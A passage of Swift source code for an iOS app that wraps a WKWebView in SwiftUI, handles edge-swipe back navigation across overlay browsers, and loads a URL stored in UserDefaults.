        manager.primaryBrowser.load(URLRequest(url: destinationLink))
        return manager.primaryBrowser
    }
    
    func updateUIView(_ browser: WKWebView, context: Context) {
        // browser.load(URLRequest(url: destinationLink))
    }
    
    func makeCoordinator() -> BrowserDelegateManager {
        BrowserDelegateManager(manager: manager)
    }
    
}

extension BrowserDelegateManager {
//    @objc func handleEdgePan(_ recognizer: UIScreenEdgePanGestureRecognizer) {
//        if recognizer.state == .ended {
//            let currentView = contentManager.additionalBrowsers.last ?? contentManager.primaryBrowser
//            if let currentView = currentView {
//                if currentView.canGoBack {
//                    currentView.goBack()
//                } else if !contentManager.additionalBrowsers.isEmpty {
//                    contentManager.cleanAdditionalBrowsersIfNeeded(for: currentView.url)
//                }
//            }
//        }
//    }
    @objc func handleEdgePan(_ recognizer: UIScreenEdgePanGestureRecognizer) {
        if recognizer.state == .ended {
            guard let currentView = recognizer.view as? WKWebView else { return }
            if currentView.canGoBack {
                currentView.goBack()
            } else if let lastOverlay = contentManager.additionalBrowsers.last, currentView == lastOverlay {
                contentManager.shouldCleanAdditional(currentLink: nil)
            }
        }
    }
}

struct CoreInterfaceView: View {
    
    @State var intercaceUrl: String = ""
    
    var body: some View {
        ZStack(alignment: .bottom) {
            if let u = URL(string: intercaceUrl) {
                MainBrowserView(
                    destinationLink: u
                )
            }
        }
        .preferredColorScheme(.dark)
        .onAppear {
            intercaceUrl = UserDefaults.standard.string(forKey: "temp_url") ?? (UserDefaults.standard.string(forKey: "saved_url") ?? "")
            if let l = UserDefaults.standard.string(forKey: "temp_url"), !l.isEmpty {
                UserDefaults.standard.set(nil, forKey: "temp_url")
            }
        }
        .onReceive(NotificationCenter.default.publisher(for: Notification.Name("LoadTempURL"))) { _ in
            if (UserDefaults.standard.string(forKey: "temp_url") ?? "") != "" {
                intercaceUrl = UserDefaults.standard.string(forKey: "temp_url") ?? ""
                UserDefaults.standard.set(nil, forKey: "temp_url")
            }
        }
    }
    
}

